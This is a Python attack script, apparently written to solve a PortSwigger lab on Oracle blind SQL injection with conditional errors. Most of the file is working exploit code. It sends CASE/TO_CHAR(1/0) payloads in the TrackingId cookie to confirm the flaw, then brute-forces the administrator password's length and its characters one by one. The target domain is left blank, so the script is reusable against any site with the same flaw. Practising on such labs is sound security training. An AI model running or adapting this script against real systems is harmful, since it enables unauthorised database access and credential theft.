# This script was written to complete the lab https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors. This lab uses an 
#   Oracle database and is sensible to SQL errors in the backend


import requests
import urllib.parse


def send_request(url, session, tracking_id, injection_payload):
  headers = {"Cookie": f"TrackingId={tracking_id}{injection_payload}; session={session}"}
  test_request = requests.get(url, headers = headers)
  return test_request.status_code


def test_vuln(url, session, tracking_id):
  true_response = send_request(url, session, tracking_id, urllib.parse.quote("' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--"))
  false_response = send_request(url, session, tracking_id, urllib.parse.quote("' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--"))
  if true_response == false_response:
    print("site is not vulnerable")
    return [False, None]

  return [True, false_response]


def get_password_length(url, session, tracking_id, max_length, error_response_code):
  for length in range(1, max_length+1):
    injection_paylaod = f"' AND (SELECT CASE WHEN (LENGTH(password) > {length}) THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--"
    response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
    if response == error_response_code:
      return [True, length]
  
  print("failed to brute force the password length")
  return [False, None]


def get_password(url, session, tracking_id, password_length, characters, error_response_code):
  password = ""
  for position in range(1, password_length+1):
    for character in characters:
      injection_paylaod = f"' AND (SELECT CASE WHEN (SUBSTR(password, {position}, 1) = '{character}') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--"
      response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
      if response != error_response_code:
        password += character
        print(f"{position}/{password_length} characters...")
        continue
      if len(password) == password_length:
        return [True, password]
  
  print("failed to brute force the password")
  return [False, None]


def main():
  DOMAIN = ""
  URL = f"https://{DOMAIN}/filter?category=category"
  SESSION_COOKIE = ''
  TRACKINGID_COOKIE = ''
  CHARACTERS = 'abcdefghijklmnopqrstuvwxyz0123456789'

  (is_vulnerable, error_response_code) = test_vuln(URL, SESSION_COOKIE, TRACKINGID_COOKIE)
  if not is_vulnerable:
    return
  print("site is vulnerable")

  (got_password_length, password_length) = get_password_length(URL, SESSION_COOKIE, TRACKINGID_COOKIE, 50, error_response_code)
  if not got_password_length:
    return
  print(f"the password length is {password_length}")

  (got_password, password) = get_password(URL, SESSION_COOKIE, TRACKINGID_COOKIE, password_length, CHARACTERS, error_response_code)
  if got_password:
    print(password)


if __name__ == "__main__":
  main()